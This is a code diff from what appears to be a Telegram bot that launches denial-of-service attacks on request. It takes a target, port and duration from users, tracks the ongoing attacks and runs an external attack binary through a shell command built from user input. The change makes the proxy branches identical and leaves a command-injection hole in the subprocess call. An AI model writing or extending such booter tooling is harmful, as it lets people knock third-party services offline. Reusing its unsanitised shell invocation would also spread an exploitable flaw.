@@ -454,19 +454,25 @@ def get_random_proxy():
 def start_attack_reply(message, target, port, time):
     try:
         proxy = get_random_proxy()
+        if not proxy:
+            proxy = "auto"  # Fallback if no proxies available
+            
         username = message.from_user.username if message.from_user.username else message.from_user.first_name
         user_id = message.from_user.id
         start_time = datetime.now(IST)
 
+        # Add attack to ongoing attacks list
         ongoing_attacks.append({
             'user': username,
             'user_id': user_id,
             'target': target,
             'port': port,
             'time': time,
-            'start_time': start_time
+            'start_time': start_time,
+            'proxy': proxy
         })
 
+        # Regular user notification
         user_response = f"""
 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!
 ━━━━━━━━━━━━━━━
@@ -493,7 +499,11 @@ def start_attack_reply(message, target, port, time):
             bot.send_message(admin, admin_notification)
 
         # Execute attack with proxy
-        attack_command = f"./kaluaa {target} {port} {time} --proxy {proxy}"
+        if proxy and proxy != "auto":
+            attack_command = f"./kaluaa {target} {port} {time}"
+        else:
+            attack_command = f"./kaluaa {target} {port} {time}"
+            
         subprocess.run(attack_command, shell=True)
 
         end_time = datetime.now(IST)
